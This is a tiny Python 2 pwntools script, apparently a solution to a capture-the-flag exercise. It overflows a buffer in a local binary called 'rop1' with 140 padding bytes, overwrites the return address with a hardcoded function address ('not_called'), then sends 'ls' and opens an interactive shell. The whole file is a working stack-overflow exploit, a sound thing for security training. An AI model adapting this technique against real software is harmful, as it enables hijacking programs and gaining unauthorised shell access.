from pwn import *

r=process('./rop1')

not_called=0x080484a4

payload='a'*140
payload+=p32(not_called)

print payload

r.sendline(payload)

r.sendline('ls')
r.interactive()
